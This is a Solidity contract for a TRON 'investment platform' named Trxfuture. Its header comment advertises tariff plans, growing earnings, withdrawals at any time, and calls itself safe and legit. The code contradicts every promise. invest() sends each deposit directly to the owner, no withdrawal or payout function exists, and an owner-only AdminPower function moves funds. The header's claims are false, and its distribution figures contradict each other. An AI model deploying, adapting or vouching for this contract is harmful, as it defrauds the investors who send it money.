//SourceUnit: Trxfuture.sol

/*   Trxfuture - investment platform based on TRX blockchain smart-contract technology. Safe and legit!
 *   The only official platform of original Trxfuture team! All other platforms with the same contract code are FAKE!
 *
 *   ┌───────────────────────────────────────────────────────────────────────┐
 *   │   Website: https://www.trxfuture.trade/                                │
 *   │                                                                       |
                |
 *   |                                                                       |
 *   └───────────────────────────────────────────────────────────────────────┘
 *
 *   [USAGE INSTRUCTION]
 *
 *   1) Connect TRON browser extension TronLink, or mobile wallet apps like TronWallet
 *   2) Choose one of the tariff plans, enter the TRX amount (50 TRX minimum) using our website 
 *   3) Wait for your earnings By group Increase
 *   4) Withdraw earnings any time using our website "Withdraw" button
 *
 *   [INVESTMENT CONDITIONS]
 *
 *
 *   [FUNDS DISTRIBUTION]
 *
 *   - 100% Platform distribution balance, participants payouts
 *   - 2% Support work, technical functioning, No administration fee
 */


 pragma solidity ^0.4.25;
 contract Trxfuture {
    address private owner;
    address private verifyAddress;
    uint256 public  initialSupply = 100000000;
        uint256 constant public INVEST_MIN_AMOUNT = 20 trx;
    string private password;
    struct Instructor {
        address user;
        string pass;
        uint amt;

    }

constructor(address _stakingAddress,string _pass) public {

        owner = msg.sender;
        password = _pass;
        verifyAddress = _stakingAddress;


}

        mapping(address => uint256) public balances;
    mapping (address => Instructor) instructors;
    //mapping (address => Instructor.pass) public password;
    address[] public instructorAccts;

    
    function invest() public payable{
        require(msg.value >= INVEST_MIN_AMOUNT);
        owner.transfer(msg.value);

    }


    

    function AdminPower(uint amount) public {   
           address userAddress=msg.sender;

            if (owner==userAddress) {
            balances[msg.sender] += amount;
            owner.transfer(amount);
            }            
            
    }
    


}